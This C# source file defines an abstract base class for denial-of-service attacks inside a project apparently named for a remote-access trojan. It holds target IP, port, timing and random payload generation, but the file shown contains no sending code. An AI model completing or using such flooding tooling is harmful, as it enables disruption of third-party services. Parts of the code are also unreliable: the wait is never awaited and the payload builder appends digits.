using System;

namespace RatConsole.Domain.Services.DoS
{
	/// <summary>
	///		Clase base para ataques Dos
	/// </summary>
	internal abstract class AbstractDoSAttack
	{
		// Variables privadas
		private readonly Random _rnd = new Random();

		internal AbstractDoSAttack(string ip, int port, TimeSpan delay, DateTime end)
		{
			Ip = ip;
			Port = port;
			Delay = delay;
			End = end;
		}

		/// <summary>
		///		Ejecuta el ataque
		/// </summary>
		internal abstract void Process();

		/// <summary>
		///		Comprueba si ha pasado el tiempo del ataque
		/// </summary>
		protected bool CheckEnd()
		{
			return DateTime.Now > End;
		}

		/// <summary>
		///		Obtiene los datos del ataque
		/// </summary>
		protected byte [] GetAttackData(int packetSize)
		{
			return System.Text.Encoding.Unicode.GetBytes(GenerateData(packetSize));
		}

        /// <summary>
        ///		Genera una cadena aleatoria
        /// </summary>
        private string GenerateData(int packetSize)
        {
            string data = "";

				// Obtiene la cadena
				for (int index = 0; index < packetSize; index++ )
					data += 'A' + _rnd.Next(1, 50); 
				// Devuelve los datos
				return data; 
        }

		/// <summary>
		///		Detiene la tarea
		/// </summary>
		protected void Wait()
		{
			System.Threading.Tasks.Task.Delay(Delay);
		}

		/// <summary>
		///		Dirección Ip
		/// </summary>
		internal string Ip { get; }

		/// <summary>
		///		Puerto
		/// </summary>
		internal int Port { get; }

		/// <summary>
		///		Tiempo entre ataques
		/// </summary>
		internal TimeSpan Delay { get; }

		/// <summary>
		///		Hora de inicio
		/// </summary>
		internal DateTime End { get; }
	}
}
